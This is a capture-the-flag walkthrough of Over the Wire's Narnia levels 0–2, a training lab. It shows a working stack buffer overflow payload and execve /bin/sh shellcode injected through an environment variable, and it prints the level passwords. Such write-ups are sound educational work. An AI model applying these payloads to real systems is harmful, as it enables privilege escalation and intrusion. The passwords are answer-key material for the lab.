# Over the Wire - Narnia

## level 0 -> 1
This game starts off giving you the username and password for level 0. In the /narnia/ directory, there is an executable and c source file for each level.

Running narnia0, the following is output on the terminal:
```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 
```
I have no idea what I'm supposed to do here, so I'm just going to guess I'll find a value to xor 0x41414141 to get 0xdeadbeef. So I enter:
```
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 0x9fecffae
buf: 0x9fecffae
val: 0x41414141
WAY OFF!!!!
```

Alrighty then. Guess I'll look at the code:

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
Ok, so is it really reading 24 characters into a buffer of size 20? In that case, I guess I'm supposed to exploit that to mess with the value of val to make it equal to 0xdeadbeef. Then I get shell.

Entering 24 0s:
```
Here is your chance: 000000000000000000000000
buf: 000000000000000000000000
val: 0x30303030
WAY OFF!!!!
```

This confirms that val can be overwritten by entering more than 20 character. Four 0 characters (ASCII code 30) have now been written to val.

Using `objdump --source narnia0`, let's look at some of the assembly. Here are the first few instructions in main, where we can see var being set.
```
0804855b <main>:
 804855b:	55                   	push   %ebp
 804855c:	89 e5                	mov    %esp,%ebp
 804855e:	53                   	push   %ebx
 804855f:	83 ec 18             	sub    $0x18,%esp
 8048562:	c7 45 f8 41 41 41 41 	movl   $0x41414141,-0x8(%ebp) <--- 0x41414141 is moved into var on the stack, 8 bytes from the base pointer
```
Further down a bit, here is where our input is read into memory using scanf:
```
8048583:	8d 45 e4             	lea    -0x1c(%ebp),%eax <--- Our input will be read into the address 28 bytes from the base pointer
 8048586:	50                   	push   %eax
 8048587:	68 d9 86 04 08       	push   $0x80486d9
 804858c:	e8 af fe ff ff       	call   8048440 <__isoc99_scanf@plt>
 8048591:	83 c4 08             	add    $0x8,%esp

```

Because the scanf call will read in up to 24 bytes, it can occupy bytes 28 through 4 from ebp. But this overlaps with var, which occupies bytes 8 through 0 from ebp. The last 4 bytes of our input will clobber the first 4 bytes of var.

Now the trouble is that we're entering in acii data to scanf, and xAD (one of our bytes of deadbeef) does not have a printable ascii representation.

Maybe I can use perl to generate a hex string and pipe the output to the program:
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xde\xad\xbe\xef"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaޭ??
val: 0xefbeadde
WAY OFF!!!!
```
Almost! Forgot to account for byte order, which is little endian. I'll need to input the last bytes in reverse order:
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
```
Ok, the program looks like it ended though. Did I get the shell?
```
narnia0@narnia:/narnia$ whoami
narnia0
```
Apparently not. Maybe I can copy paste the output.
```
narnia0@narnia:/narnia$ perl -e 'print "a"x20 . "\xef\xbe\xad\xde"'
aaaaaaaaaaaaaaaaaaaaﾭ?narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭ?
buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0x3fadbeef
WAY OFF!!!!
```
Nope. Something is lost in translation. So I somehow need to find a way to get the hex input into the program but also keep it from exiting.

After some searching, I found a useful trick. You can pipe multiple commands into a program by enclosing them in parenthesis. Each command is a separate input to the program. So I could provide two commands, and the first would be used as input for the 'Here is your chance' prompt, and the second would be used as input into the shell that's launched. Let's try it:

```
narnia0@narnia:/narnia$ ( perl -e 'print "a"x20 . "\xef\xbe\xad\xde"'; cat; ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ?
val: 0xdeadbeef
whoami
narnia1
```

Sweet, it worked. Now I can just `cat /etc/narnia_pass/narnia1`.

<details><summary>Password</summary>
	<p>	
efeidiedae
</p>
</details>


## level 1 -> 2

Running the narnia1 executable produces the following output:
```
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

Naively setting EGG on the command line to a command (ls) segfaults. Time to look at the code.

The program checks for an environmet variable called 'EGG'. If it's found, it's stored to the funtion pointer ret, and then called.
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

A refresher on function pointers. `int (*ret)();` means that ret is a pointer to a function that takes no args and returns an int. It must be initialized to an address of a function in the program. Which explains why I made the program segfault by setting EGG to a command.

But what's happening under the hood? Take a look at some of the assembly:
```
 80484a3:	68 40 85 04 08       	push   $0x8048540
 80484a8:	e8 73 fe ff ff       	call   8048320 <getenv@plt>
 80484ad:	83 c4 04             	add    $0x4,%esp
 80484b0:	89 45 fc             	mov    %eax,-0x4(%ebp)
 80484b3:	8b 45 fc             	mov    -0x4(%ebp),%eax
 80484b6:	ff d0                	call   *%eax
 ```
getenv is called with EGG and the return value is saved. Next is a call instruction to what the address that's in eax points to.

So obviously, I can make EGG refer to a function that's already compiled into the program, but looking through the disassembled binary, I don't see anything really useful. My next step is to start searching online for ways to abuse function pointers.

And of course it turns out there are ways to do this. Namely, injecting [Shellcode](https://en.wikipedia.org/wiki/Shellcode). The idea is to take a small program that executes a shell (or something else), compile it, and get the machine code loaded into the program and into a function pointer.

Ok, so my first try is to write a simple c program:
```
#include <stdio.h>

int main( ) {
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}
```

Compile it (`gcc -m32 attack.c -o attack`), and get the assembly using `objdump -D -m i386 -M intel  attack`:
```
000005a0 <main>:
 5a0:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 5a4:	83 e4 f0             	and    esp,0xfffffff0
 5a7:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 5aa:	55                   	push   ebp
 5ab:	89 e5                	mov    ebp,esp
 5ad:	53                   	push   ebx
 5ae:	51                   	push   ecx
 5af:	83 ec 10             	sub    esp,0x10
 5b2:	e8 3b 00 00 00       	call   5f2 <__x86.get_pc_thunk.ax>
 5b7:	05 49 1a 00 00       	add    eax,0x1a49
 5bc:	8d 90 80 e6 ff ff    	lea    edx,[eax-0x1980]
 5c2:	89 55 f0             	mov    DWORD PTR [ebp-0x10],edx
 5c5:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [ebp-0xc],0x0
 5cc:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]
 5cf:	83 ec 04             	sub    esp,0x4
 5d2:	6a 00                	push   0x0
 5d4:	8d 4d f0             	lea    ecx,[ebp-0x10]
 5d7:	51                   	push   ecx
 5d8:	52                   	push   edx
 5d9:	89 c3                	mov    ebx,eax
 5db:	e8 30 fe ff ff       	call   410 <execve@plt>
 5e0:	83 c4 10             	add    esp,0x10
 5e3:	b8 00 00 00 00       	mov    eax,0x0
 5e8:	8d 65 f8             	lea    esp,[ebp-0x8]
 5eb:	59                   	pop    ecx
 5ec:	5b                   	pop    ebx
 5ed:	5d                   	pop    ebp
 5ee:	8d 61 fc             	lea    esp,[ecx-0x4]
 5f1:	c3                   	ret    
```
Using `xxd attack` to find the hex for the strings:
`00000680: 2f62 696e 2f73 6800 011b 033b 3800 0000  /bin/sh....;8...`

Taking the bytes (in hex) and attempting to save this to EGG, I encounter a problem: Null bytes. Bash does not like them.

And of course (luckily for me), this is a well-known problem. I found [some](https://nets.ec/Shellcode/Null-free) [great](http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Buffer_Overflow.pdf) [references](http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/shellcode-walkthrough) online that talk about this. But the highlight has to be the [shell-storm shellcode collection](http://shell-storm.org/shellcode/).

I picked out a [tiny execve sh example](http://shell-storm.org/shellcode/files/shellcode-841.php) to test out.

First, I will use perl to stash the hex bytes in EGG:
```
narnia1@narnia:/tmp/ww$ export EGG=$(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') 
narnia1@narnia:/tmp/ww$ echo $EGG
1???
    Qh//shh/bin??̀

```

Running narnia1 doesn't segfault, but wait...it asks me to provide something to EGG. So it doesn't pick up my environment variable. Hmmm...

That is annoying, but further investigation shows that you can actually pass environment variables into a program on the command line:
```
narnia1@narnia:/narnia$ EGG=$(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
```
<details><summary>Password</summary>
	<p>	
nairiepecu
</p>
</details>

That was super cool. 


